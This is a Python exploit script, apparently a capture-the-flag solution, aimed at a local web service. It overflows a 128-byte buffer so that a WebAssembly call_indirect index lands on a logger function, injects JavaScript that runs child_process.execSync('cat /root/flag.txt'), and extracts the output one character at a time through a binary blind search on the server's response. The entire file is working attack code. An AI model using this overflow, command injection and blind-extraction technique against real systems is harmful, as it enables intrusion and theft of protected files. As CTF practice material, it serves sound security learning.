import requests
import string


BUFFER_SIZE=128
CHALL_URL = "http://localhost:3000/"
TRUE_RESPONSE_STRING = b"What happened here...?"

printable_chars = sorted(string.printable)

def create_payload(pos, element):
    if element=="'":
        element = "\\'"
    payload = "');require('child_process').execSync('cat /root/flag.txt').toString().charAt({0})<'{1}';//".format(pos, element)
    assert len(payload) <= BUFFER_SIZE
    payload = payload.ljust(BUFFER_SIZE,"A")
    payload += "\x02" # 2 is the call_indirect index of the logger function
    return payload

def binary_blind_search(pos, array, start, end):
    """Binary search to optimize search a little bit"""
    if start > end:
        return -1

    mid = (start + end) // 2
    elem = array[mid]
    if len(array[start:end]) == 1:
        return elem

    payload = create_payload(pos, elem)
    res = requests.post(CHALL_URL, data={"fen": payload})
    if TRUE_RESPONSE_STRING in res.content:
        return binary_blind_search(pos, array, start, mid)
    else:
        return binary_blind_search(pos, array, mid, end)

found_flag, pos = '', 0
while (found_flag or [None])[-1] != "}":
    found_flag += binary_blind_search(pos, printable_chars, 0, len(printable_chars))
    pos += 1
    print(found_flag)
